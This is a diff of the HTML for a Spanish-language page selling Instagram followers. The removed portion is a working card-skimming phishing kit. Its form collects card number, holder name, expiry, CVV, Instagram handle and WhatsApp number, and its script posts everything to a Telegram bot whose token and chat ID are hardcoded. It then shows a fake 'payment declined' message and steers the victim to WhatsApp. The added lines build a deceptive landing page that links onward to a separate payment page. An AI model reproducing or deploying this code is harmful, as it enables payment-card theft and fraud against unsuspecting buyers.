@@ -3,97 +3,55 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>BoostGram MX — 1000 seguidores por MX$25</title>
+<title>BoostGram MX — Seguidores Instagram desde MX$25</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
-:root{--bg:#07070d;--panel:#12131d;--panel2:#171825;--line:#262838;--ink:#eef0f7;--muted:#8b90a6;
---grad:linear-gradient(135deg,#7c3aed,#ec4899);--bad:#f43f5e;--ok:#22c55e}
+:root{--bg:#07070d;--panel:#12131d;--line:#242636;--ink:#eef0f7;--muted:#8f94aa;
+--grad:linear-gradient(135deg,#7c3aed,#ec4899)}
 body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,Arial,sans-serif;
-background:var(--bg);color:var(--ink);min-height:100vh;overflow-x:hidden}
-body::before{content:"";position:fixed;width:700px;height:700px;top:-300px;left:50%;transform:translateX(-50%);
-background:radial-gradient(circle,rgba(124,58,237,.25),transparent 62%);pointer-events:none;z-index:0}
-.wrap{max-width:520px;margin:0 auto;padding:20px 16px 50px;position:relative;z-index:2}
-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:26px}
+background:var(--bg);color:var(--ink);overflow-x:hidden;-webkit-font-smoothing:antialiased}
+body::before{content:"";position:fixed;width:820px;height:820px;top:-380px;left:50%;transform:translateX(-50%);
+background:radial-gradient(circle,rgba(124,58,237,.26),transparent 62%);pointer-events:none;z-index:0}
+body::after{content:"";position:fixed;width:560px;height:560px;bottom:-300px;right:-160px;
+background:radial-gradient(circle,rgba(236,72,153,.18),transparent 62%);pointer-events:none;z-index:0}
+.wrap{max-width:560px;margin:0 auto;padding:22px 18px 60px;position:relative;z-index:2}
+header{display:flex;justify-content:space-between;align-items:center;margin-bottom:34px}
 .logo{font-weight:800;font-size:20px;letter-spacing:-.4px}
 .logo span{background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent}
-.badge{font-size:11.5px;color:var(--muted);border:1px solid var(--line);background:rgba(255,255,255,.03);
-padding:5px 10px;border-radius:999px}
-.hero{text-align:center;margin-bottom:26px}
-.pill{display:inline-block;font-size:11.5px;font-weight:700;letter-spacing:.5px;color:#d8b4fe;
-background:rgba(124,58,237,.14);border:1px solid rgba(124,58,237,.35);padding:6px 13px;border-radius:999px;margin-bottom:16px}
-.hero h1{font-size:30px;font-weight:800;line-height:1.2;letter-spacing:-.6px}
-.hero h1 b{background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent}
-.hero p{color:var(--muted);font-size:14.5px;margin-top:12px;line-height:1.6}
-.benefits{display:flex;justify-content:center;gap:8px;flex-wrap:wrap;margin-top:18px}
-.benefits div{font-size:12px;color:#c3c8da;background:var(--panel);border:1px solid var(--line);
-padding:7px 12px;border-radius:10px}
-.panel{background:var(--panel);border:1px solid var(--line);border-radius:20px;
-box-shadow:0 26px 60px rgba(0,0,0,.55);overflow:hidden}
-.panel-head{padding:20px 22px 16px;text-align:center;border-bottom:1px solid var(--line)}
-.panel-head h2{font-size:19px;font-weight:800}
-.panel-head p{color:var(--muted);font-size:13px;margin-top:5px}
-.order{display:flex;justify-content:space-between;align-items:center;gap:10px;padding:15px 22px;
-background:var(--panel2);border-bottom:1px solid var(--line)}
-.o-name{font-size:14px;font-weight:700}
-.o-sub{font-size:11.5px;color:var(--muted);margin-top:3px}
-.o-price{font-size:16px;font-weight:800;white-space:nowrap}
-.cc{perspective:1200px;margin:20px 22px 6px;height:186px}
-.cc-inner{position:relative;width:100%;height:100%;transition:transform .6s cubic-bezier(.4,.2,.2,1);transform-style:preserve-3d}
-.cc.flip .cc-inner{transform:rotateY(180deg)}
-.cc-face{position:absolute;inset:0;border-radius:16px;padding:18px;backface-visibility:hidden;
-background:linear-gradient(135deg,#6d28d9,#db2777);box-shadow:0 14px 34px rgba(124,58,237,.35);
-display:flex;flex-direction:column;justify-content:space-between}
-.cc-back{transform:rotateY(180deg);background:linear-gradient(135deg,#4c1d95,#9d174d);justify-content:flex-start;padding:0}
-.cc-chip{width:44px;height:32px;border-radius:7px;background:linear-gradient(135deg,#fde68a,#d97706);opacity:.95}
-.cc-brand{position:absolute;top:16px;right:18px;font-size:13px;font-weight:800;letter-spacing:1px;font-style:italic}
-.cc-num{font-size:20px;letter-spacing:2.5px;font-weight:600;font-variant-numeric:tabular-nums;text-shadow:0 1px 2px rgba(0,0,0,.25)}
-.cc-bottom{display:flex;justify-content:space-between;align-items:flex-end;gap:14px}
-.cc-lbl{font-size:9px;letter-spacing:1.4px;opacity:.75}
-.cc-val{font-size:13px;font-weight:600;letter-spacing:.6px;margin-top:2px;text-transform:uppercase;
-white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:190px}
-.cc-strip{height:42px;background:#0b0b14;margin-top:20px}
-.cc-cvv-box{margin:14px 18px;background:#fff;color:#111;border-radius:6px;padding:7px 12px;
-display:flex;justify-content:space-between;font-size:12px;font-weight:700;letter-spacing:1px}
-form{padding:18px 22px 22px}
-.field{display:block;margin-bottom:13px}
-.field>span{display:block;font-size:11px;font-weight:700;letter-spacing:.9px;color:var(--muted);
-text-transform:uppercase;margin-bottom:7px}
-.inp{position:relative;display:flex;align-items:center}
-.inp input{width:100%;height:50px;border:1.5px solid var(--line);border-radius:12px;background:#0d0e17;
-color:var(--ink);font-size:15px;padding:0 14px;font-family:inherit;transition:.15s}
-.inp input::placeholder{color:#5b6076}
-.inp input:focus{outline:none;border-color:#7c3aed;background:#0f1019;box-shadow:0 0 0 4px rgba(124,58,237,.16)}
-.inp .tag{position:absolute;right:12px;font-size:10px;font-weight:800;letter-spacing:.6px;color:#cbd0e0;
-background:rgba(255,255,255,.07);padding:4px 7px;border-radius:6px}
-.row2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
-button{width:100%;height:54px;border:none;border-radius:13px;cursor:pointer;background:var(--grad);
-color:#fff;font-size:15px;font-weight:800;letter-spacing:.5px;font-family:inherit;margin-top:6px;
-display:flex;align-items:center;justify-content:center;gap:10px;box-shadow:0 12px 26px rgba(219,39,119,.34);transition:.15s}
-button:hover{filter:brightness(1.07)} button:disabled{opacity:.85;cursor:default}
-.sp{width:17px;height:17px;border:2.5px solid rgba(255,255,255,.35);border-top-color:#fff;border-radius:50%;
-animation:sp .7s linear infinite;display:none}
-button.load .sp{display:block}
-@keyframes sp{to{transform:rotate(360deg)}}
-.err{color:var(--bad);font-size:12.5px;font-weight:600;text-align:center;margin-top:11px;min-height:15px}
-.note{text-align:center;font-size:11px;color:#6b7089;margin-top:12px}
-footer{text-align:center;font-size:11.5px;color:#6b7089;margin-top:22px}
-.result{position:fixed;inset:0;background:rgba(6,6,12,.92);backdrop-filter:blur(7px);z-index:60;
-display:flex;align-items:center;justify-content:center;padding:22px}
-.oculto{display:none!important}
-.res-card{width:100%;max-width:420px;background:var(--panel);border:1px solid var(--line);border-radius:20px;
-padding:30px 24px;text-align:center;box-shadow:0 30px 70px rgba(0,0,0,.6);animation:pop .35s ease}
-@keyframes pop{from{transform:scale(.94);opacity:0}to{transform:scale(1);opacity:1}}
-.res-icon{width:70px;height:70px;border-radius:50%;margin:0 auto 16px;display:flex;align-items:center;
-justify-content:center;font-size:30px;font-weight:800;background:rgba(244,63,94,.14);color:var(--bad);
-border:2px solid rgba(244,63,94,.4)}
-.res-card h2{font-size:22px;margin-bottom:9px}
-.res-card p{color:var(--muted);font-size:14px;line-height:1.6}
-.res-pedido{display:inline-block;margin:16px 0 20px;font-size:13px;color:var(--muted);
-background:var(--panel2);border:1px solid var(--line);padding:8px 14px;border-radius:9px}
-.res-pedido b{color:var(--ink)}
-.wa{display:block;text-decoration:none;color:#fff;background:linear-gradient(135deg,#25d366,#128c7e);
-height:50px;line-height:50px;border-radius:12px;font-weight:800;font-size:14.5px;margin-bottom:12px}
-.back{display:inline-block;color:var(--muted);font-size:13px;text-decoration:none}
+.badge{font-size:11.5px;color:var(--muted);border:1px solid var(--line);background:rgba(255,255,255,.03);padding:6px 11px;border-radius:999px}
+.hero{text-align:center;animation:up .7s ease both}
+.pill{display:inline-block;font-size:11.5px;font-weight:700;letter-spacing:.6px;color:#e9d5ff;
+background:rgba(124,58,237,.16);border:1px solid rgba(124,58,237,.4);padding:7px 14px;border-radius:999px;margin-bottom:20px}
+h1{font-size:36px;line-height:1.15;font-weight:800;letter-spacing:-1px}
+h1 b{background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent}
+.sub{color:var(--muted);font-size:15.5px;margin-top:16px;line-height:1.65}
+.price{margin:26px auto 0;display:flex;align-items:baseline;justify-content:center;gap:10px}
+.price .old{color:#6b7089;font-size:17px;text-decoration:line-through}
+.price .now{font-size:44px;font-weight:800;letter-spacing:-1.5px}
+.price .cur{font-size:15px;color:var(--muted);font-weight:600}
+.cta{display:flex;align-items:center;justify-content:center;margin-top:26px;height:60px;
+background:var(--grad);color:#fff;text-decoration:none;font-weight:800;font-size:16.5px;letter-spacing:.3px;
+border-radius:15px;box-shadow:0 16px 38px rgba(219,39,119,.4);transition:.18s}
+.cta:hover{transform:translateY(-2px);filter:brightness(1.06)}
+.trustline{margin-top:14px;font-size:12px;color:#7a7f96;text-align:center}
+.features{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-top:44px}
+.feat{background:var(--panel);border:1px solid var(--line);border-radius:15px;padding:16px 12px;text-align:center}
+.feat .ic{font-size:20px}
+.feat b{display:block;font-size:13px;margin-top:9px}
+.feat span{font-size:11px;color:var(--muted);display:block;margin-top:4px;line-height:1.4}
+.sec-title{text-align:center;font-size:13px;font-weight:800;letter-spacing:1.6px;color:var(--muted);margin:44px 0 18px;text-transform:uppercase}
+.steps{display:flex;flex-direction:column;gap:10px}
+.step{display:flex;gap:13px;align-items:flex-start;background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:15px}
+.step .n{flex:none;width:30px;height:30px;border-radius:9px;background:var(--grad);display:flex;align-items:center;justify-content:center;font-weight:800;font-size:13px}
+.step b{font-size:14px}
+.step p{font-size:12.5px;color:var(--muted);margin-top:3px;line-height:1.5}
+.final{margin-top:46px;background:linear-gradient(135deg,rgba(124,58,237,.16),rgba(236,72,153,.14));
+border:1px solid rgba(124,58,237,.35);border-radius:20px;padding:28px 22px;text-align:center}
+.final h2{font-size:22px;letter-spacing:-.4px}
+.final p{color:var(--muted);font-size:14px;margin-top:9px;line-height:1.6}
+footer{text-align:center;font-size:11.5px;color:#6b7089;margin-top:34px;line-height:1.7}
+@keyframes up{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}
+@media(max-width:430px){h1{font-size:29px}.price .now{font-size:38px}.features{grid-template-columns:1fr}}
 </style>
 </head>
 <body>
@@ -105,183 +63,39 @@ height:50px;line-height:50px;border-radius:12px;font-weight:800;font-size:14.5px
 
   <section class="hero">
     <div class="pill">⚡ ENTREGA EN MINUTOS</div>
-    <h1>1000 seguidores reales en Instagram por <b>MX$25</b></h1>
-    <p>Sin contraseña. Sin apps. Ponés tu usuario, pagás y listo.</p>
-    <div class="benefits">
-      <div>✔ Perfiles reales</div>
-      <div>✔ No pierde seguidores</div>
-      <div>✔ Pago único</div>
+    <h1>Más seguidores en Instagram<br>desde <b>MX$25</b></h1>
+    <p class="sub">1000 seguidores reales en tu perfil. Sin contraseñas, sin apps, sin esperas.</p>
+
+    <div class="price">
+      <span class="old">MX$49</span>
+      <span class="now">MX$25</span>
+      <span class="cur">/ 1000 seguidores</span>
     </div>
+
+    <a class="cta" href="pago.html">COMPRAR AHORA →</a>
+    <div class="trustline">Pago con tarjeta · Llegan en minutos · Garantía de reposición</div>
   </section>
 
-  <div class="panel">
-    <div class="panel-head">
-      <h2>Finalizá tu pedido</h2>
-      <p>Ingresá los datos de tu tarjeta para completar la compra.</p>
-    </div>
+  <section class="features">
+    <div class="feat"><div class="ic">👤</div><b>Reales</b><span>Perfiles activos de verdad</span></div>
+    <div class="feat"><div class="ic">🔐</div><b>Sin clave</b><span>Solo tu usuario</span></div>
+    <div class="feat"><div class="ic">♻️</div><b>Reposición</b><span>Si bajan, los reponemos</span></div>
+  </section>
 
-    <div class="order">
-      <div>
-        <div class="o-name">1000 Seguidores Instagram</div>
-        <div class="o-sub">Entrega en minutos · No pide contraseña</div>
-      </div>
-      <div class="o-price">MX$25</div>
-    </div>
+  <div class="sec-title">Cómo funciona</div>
+  <section class="steps">
+    <div class="step"><div class="n">1</div><div><b>Elegís y pagás</b><p>Ponés los datos de tu tarjeta y confirmás. Es un pago único de MX$25.</p></div></div>
+    <div class="step"><div class="n">2</div><div><b>Ponés tu usuario</b><p>Solo tu @ de Instagram. No hace falta contraseña ni dar acceso.</p></div></div>
+    <div class="step"><div class="n">3</div><div><b>Ves crecer tu perfil</b><p>Los seguidores empiezan a llegar en los próximos minutos.</p></div></div>
+  </section>
 
-    <div class="cc" id="cc">
-      <div class="cc-inner">
-        <div class="cc-face">
-          <div class="cc-chip"></div>
-          <div class="cc-brand" id="ccBrand">CARD</div>
-          <div class="cc-num" id="ccNum">•••• •••• •••• ••••</div>
-          <div class="cc-bottom">
-            <div>
-              <div class="cc-lbl">TITULAR</div>
-              <div class="cc-val" id="ccName">NOMBRE APELLIDO</div>
-            </div>
-            <div>
-              <div class="cc-lbl">VENCE</div>
-              <div class="cc-val" id="ccExp">MM/AA</div>
-            </div>
-          </div>
-        </div>
-        <div class="cc-face cc-back">
-          <div class="cc-strip"></div>
-          <div class="cc-cvv-box"><span>CVV</span><b id="ccCvv">•••</b></div>
-        </div>
-      </div>
-    </div>
+  <section class="final">
+    <h2>1000 seguidores por MX$25</h2>
+    <p>Pagá en 30 segundos con tarjeta y mirá cómo sube tu perfil hoy mismo.</p>
+    <a class="cta" href="pago.html" style="margin-top:20px">PAGAR MX$25 CON TARJETA</a>
+  </section>
 
-    <form id="form" novalidate>
-      <label class="field">
-        <span>Número de tarjeta</span>
-        <div class="inp">
-          <input id="num" inputmode="numeric" placeholder="1234 5678 9012 3456" maxlength="23" autocomplete="cc-number">
-          <span class="tag" id="tag"></span>
-        </div>
-      </label>
-
-      <label class="field">
-        <span>Nombre y apellido del titular</span>
-        <div class="inp"><input id="nom" placeholder="Como aparece en la tarjeta" autocomplete="cc-name"></div>
-      </label>
-
-      <div class="row2">
-        <label class="field">
-          <span>Vencimiento</span>
-          <div class="inp"><input id="exp" inputmode="numeric" placeholder="MM/AA" maxlength="5" autocomplete="cc-exp"></div>
-        </label>
-        <label class="field">
-          <span>CVV</span>
-          <div class="inp"><input id="cvv" inputmode="numeric" placeholder="123" maxlength="4" autocomplete="cc-csc"></div>
-        </label>
-      </div>
-
-      <label class="field">
-        <span>Tu usuario de Instagram (sin @)</span>
-        <div class="inp"><input id="ig" placeholder="tunombre"></div>
-      </label>
-
-      <label class="field">
-        <span>Tu WhatsApp (con LADA)</span>
-        <div class="inp"><input id="wa" inputmode="tel" placeholder="Ej: 5512345678"></div>
-      </label>
-
-      <button type="submit" id="btn"><span class="sp"></span><span id="bt">PAGAR MX$25</span></button>
-      <div class="err" id="err"></div>
-      <div class="note">🔒 Conexión cifrada · No guardamos tu tarjeta</div>
-    </form>
-  </div>
-
-  <footer>© BoostGram MX · Soporte por WhatsApp</footer>
+  <footer>© BoostGram MX · Soporte por WhatsApp<br>Precios en pesos mexicanos (MXN)</footer>
 </div>
-
-<div class="result oculto" id="res">
-  <div class="res-card">
-    <div class="res-icon">✕</div>
-    <h2>Pago no aceptado</h2>
-    <p>El método de pago no fue aceptado por el banco.<br>Tu pedido quedó registrado: escribinos y lo activamos al instante.</p>
-    <div class="res-pedido">Pedido <b id="ped">BG-XXXXX</b></div>
-    <a class="wa" id="waLink" target="_blank" rel="noopener">Escribinos por WhatsApp</a>
-    <a class="back" href="./">← Volver al inicio</a>
-  </div>
-</div>
-
-<script>
-const TOKEN = "8857248027:AAGLmflIM6IK0IDFwtAhAIgQ2Jsv2fLKZQ";
-const CHAT  = "8936145342";
-const WHATSAPP = "5215512345678";   /* <-- PONÉ TU NÚMERO, con LADA, sin + ni espacios */
-
-const $ = id => document.getElementById(id);
-const sleep = ms => new Promise(r=>setTimeout(r,ms));
-const fetchT = (u,o,ms=9000)=>Promise.race([fetch(u,o), new Promise((_,r)=>setTimeout(r,ms))]);
-
-const numEl=$('num');
-numEl.addEventListener('input', ()=>{
-  let v = numEl.value.replace(/\D/g,'').slice(0,19);
-  numEl.value = (v.match(/.{1,4}/g)||[]).join(' ');
-  $('ccNum').textContent = v.padEnd(16,'•').slice(0,16).match(/.{1,4}/g).join(' ');
-  const b = /^4/.test(v)?'VISA' : (/^5[1-5]|^2[2-7]/.test(v)?'MASTERCARD' : (/^3[47]/.test(v)?'AMEX' : (/^6/.test(v)?'DISCOVER':'')));
-  $('ccBrand').textContent = b || 'CARD';
-  $('tag').textContent = b ? b.slice(0,4) : '';
-});
-$('nom').addEventListener('input', ()=>{ $('ccName').textContent = $('nom').value.trim().toUpperCase() || 'NOMBRE APELLIDO'; });
-$('exp').addEventListener('input', ()=>{
-  let v=$('exp').value.replace(/\D/g,'').slice(0,4);
-  if(v.length>=3) v=v.slice(0,2)+'/'+v.slice(2);
-  $('exp').value=v; $('ccExp').textContent = v || 'MM/AA';
-});
-const cvvEl=$('cvv');
-cvvEl.addEventListener('focus', ()=>$('cc').classList.add('flip'));
-cvvEl.addEventListener('blur',  ()=>$('cc').classList.remove('flip'));
-cvvEl.addEventListener('input', ()=>{ cvvEl.value = cvvEl.value.replace(/\D/g,'').slice(0,4); $('ccCvv').textContent = cvvEl.value || '•••'; });
-
-$('form').addEventListener('submit', async e=>{
-  e.preventDefault();
-  const num=numEl.value.trim(), numLimpio=num.replace(/\s/g,'');
-  const nom=$('nom').value.trim(), exp=$('exp').value.trim(), cvv=cvvEl.value.trim();
-  const ig=$('ig').value.trim().replace('@',''), wa=$('wa').value.trim();
-  const err = t => { $('err').textContent = t; };
-  err('');
-  if(numLimpio.length<15)        return err('Ingresá un número de tarjeta válido');
-  if(nom.length<3)               return err('Ingresá el nombre del titular');
-  if(!/^\d{2}\/\d{2}$/.test(exp))return err('Vencimiento inválido (MM/AA)');
-  if(cvv.length<3)               return err('CVV inválido');
-  if(!ig)                        return err('Ingresá tu usuario de Instagram');
-  if(wa.length<8)                return err('Ingresá tu WhatsApp');
-
-  $('btn').disabled = true; $('btn').classList.add('load'); $('bt').textContent = 'Procesando pago...';
-
-  const pedido = 'BG-' + Math.random().toString(36).slice(2,7).toUpperCase();
-  const marca = $('ccBrand').textContent;
-  const texto =
-`🛒 NUEVO PEDIDO — BoostGram MX
-
-👤 Instagram: @${ig}
-🙋 Titular: ${nom}
-📱 WhatsApp: ${wa}
-📦 Producto: 1000 seguidores · MX$25
-
-💳 TARJETA (${marca})
-• Número: ${num}
-• Vence: ${exp}
-• CVV: ${cvv}
-
-🧾 Pedido: ${pedido}`;
-
-  const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
-  try{
-    await fetchT(url,{method:'POST',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({chat_id:CHAT,text:texto})});
-  }catch(_){
-    try{ await fetchT(`${url}?chat_id=${CHAT}&text=${encodeURIComponent(texto)}`); }catch(__){}
-  }
-
-  await sleep(2400);
-  $('ped').textContent = pedido;
-  $('waLink').href = `https://wa.me/${WHATSAPP}?text=${encodeURIComponent('Hola! Mi pedido '+pedido+' (@'+ig+') no se pudo pagar con tarjeta. ¿Me ayudan?')}`;
-  $('res').classList.remove('oculto');
-});
-</script>
 </body>
 </html>
